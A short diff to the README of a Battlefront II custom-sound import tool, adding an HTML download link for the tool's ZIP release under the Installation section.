@@ -5,6 +5,12 @@ To import custom sounds into Battlefront II you'll need 2 other programs:
 - Frosty Mod Editor
 
 ## Installation
+<header>
+  <ul>
+    <li><a href="https://github.com/DanielElam/bf2-sound-import/releases/download/1.0/dandev-el3.zip">Download <strong>ZIP File</strong></a></li>
+  </ul>
+</header>
+
 Extract the zipped files into an empty folder, you should save your sound files in the same folder for simplicity.
 
 # Save MP3
